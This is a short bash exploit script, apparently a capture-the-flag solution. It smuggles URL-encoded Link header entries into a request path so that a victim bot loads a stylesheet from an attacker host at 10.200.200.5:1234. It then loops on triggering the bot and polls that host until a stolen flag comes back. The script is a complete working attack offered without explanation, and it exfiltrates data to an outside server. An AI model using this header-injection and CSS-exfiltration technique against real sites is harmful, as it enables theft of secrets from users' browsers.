ENC="/test%3e%3brel%3ddns-prefetch%2c%3chttp%3a%2f%2f10.200.200.5%3a1234%2fs.css%3e%3brel%3dstylesheet%2c%3ctest"
BOTRUN="http://localhost:8081/bot/run?url=http://vuln-server:8080${ENC}"
HOST="http://10.200.200.5:1234"

while true; do
  resp=$(curl -s --max-time 75 "$BOTRUN")
  flag=$(curl -s "$HOST/status" | sed 's/.*flag=//')
  echo "bot=$resp  flag=$flag"
  case "$flag" in *"}"*) echo "DONE: $flag"; break;; esac
  [ "$resp" = "pls wait" ] && sleep 3
done
